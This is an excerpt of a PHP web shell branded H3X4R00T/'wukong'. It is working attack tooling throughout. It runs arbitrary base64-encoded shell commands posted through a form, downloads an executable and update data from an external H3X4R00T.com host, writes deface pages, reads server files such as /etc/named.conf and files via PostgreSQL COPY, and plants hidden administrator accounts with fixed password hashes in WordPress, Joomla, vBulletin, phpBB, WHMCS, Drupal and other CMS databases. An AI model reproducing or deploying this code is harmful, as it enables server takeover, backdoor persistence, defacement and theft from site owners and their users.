...
function _wukong_cgicmd($cmd,$lang="",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$out = "";
		if(strpos($data, "[H3X4R00T~api]") !== false && strpos($data, '[H3X4R00T~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_H3X4R00T.value = btoa(unescape(encodeURIComponent(this.command_H3X4R00T.value)));" method="POST">Execute Command: <input name="command_H3X4R00T" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_H3X4R00T'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$H3X4R00T = "cd '".addslashes(str_replace("\\","/",@wukongGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_H3X4R00T']);
echo wukongEx($H3X4R00T);
}
echo'</pre>
</body></html>';
exit;}
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="wukong_exploit"><center><a href="https://t.me/H3X4R00T" target="_blank"><span><font class="wukong-text" color="#eaf717">WE ARE GODS EYE</font></span></a></center></div></td>
</tr>
<tr>
...
$curl = new wukongCURL();
$content = $curl->Send("http://H3X4R00T.com/market.php");
...
echo '<div class="header">';
$news = new wukongCURL();
$about_us = $news->Send("http://H3X4R00T.com/aboutus.php");
if(empty($about_us)){
...
</center></pre><iframe src='tg://resolve?domain=H3X4R00T' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
wukongfooter();
...
if($res){
$ff = 'http://'.$realurl.$realpath."/H3X4R00T.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/H3X4R00T.php";
...
function wukongcheckupdate(){
	...
	if(function_exists("curl_version")){
		...
		$json = $update->Send("http://H3X4R00T.com/update.json?ver=".__wukong_VERSION__);
		...
		if($json){
			...
			if(isset($json["H3X4R00T"]) && !empty($json["H3X4R00T"])){
				$data["H3X4R00T"] = $json["H3X4R00T"];
			}
...
$hash = $_POST['wukong2'];
if(!empty($hash)){
$hash_type = $_POST['H3X4R00T'];
$email = "H3X4R00T@gmail.com";
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $H3X4R00T = fopen("'.$fname.'","w"); fwrite($H3X4R00T,$x);';
...
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('H3X4R00T@fbi.gov')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
$wukongSole = new wukongCURL(true);
$saveurl = $wukongSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$wukongSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=H3X4R00T@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$H3X4R00T = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
...
echo __pre();
$H3X4R00T9 = _wukong_file('/etc/named.conf');
if(is_array($H3X4R00T9)){
foreach($H3X4R00T9 as $H3X4R00T13){
if(@eregi('zone',$H3X4R00T13)){
preg_match_all('#zone "(.*)"#',$H3X4R00T13,$H3X4R00T14);
if(strlen(trim($H3X4R00T14[1][0])) > 2){
echo $H3X4R00T14[1][0].'<br>';
}}}
}
}else{
echo __pre();
...
$s = $wukong->Send('http://H3X4R00T.com/bc/windows.exe');
$tmpdir = wukong_TEMPDIR;
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'H3X4R00T', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'H3X4R00T@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$H3X4R00T=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($H3X4R00T);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($H3X4R00T);
$res = $solevis['ID'];
}
$H3X4R00T=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','H3X4R00T'),(null,'".$res."','last_name','H3X4R00T'),(null,'".$res."','nickname','H3X4R00T'),(null,'".$res."','description','H3X4R00T'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($H3X4R00T){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'H3X4R00T', 'inputSize' => '50', 'disabled' => true),
 'td8'=>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'H3X4R00T@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['wukong10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($H3X4R00T);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($H3X4R00T);
$res = $solevis['id'];
}
$H3X4R00T=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'H3X4R00T', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'H3X4R00T@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$H3X4R00T=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$H3X4R00T=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$H3X4R00T=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($H3X4R00T);
if($sole == 1){
$solevis = mysqli_fetch_assoc($H3X4R00T);
$res = $solevis['userid'];
}
$H3X4R00T=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('H3X4R00T');
$H3X4R00T=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['wukong9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['wukong10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$H3X4R00T=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$H3X4R00T=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','H3X4R00T@fbi.gov','filtered_html','1','Europe/Berlin','H3X4R00T@fbi.gov')") or die(mysqli_error($conn));
$H3X4R00T=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($H3X4R00T);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($H3X4R00T);
$res = $solevis['uid'];
}
$H3X4R00T=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['wukong8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'H3X4R00T');
$H3X4R00T=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','H3X4R00T@fbi.gov')") or die(mysqli_error($conn));
if($H3X4R00T){
__alert('Success... '.$admin.' is created...');}
}
}
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$H3X4R00T = explode(':', $visible);
			$cwd = str_replace("{user}", trim($H3X4R00T[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($H3X4R00T[1]), trim($H3X4R00T[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE H3X4R00T(file text);COPY H3X4R00T FROM '".addslashes($str)."';select file from H3X4R00T;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table H3X4R00T');
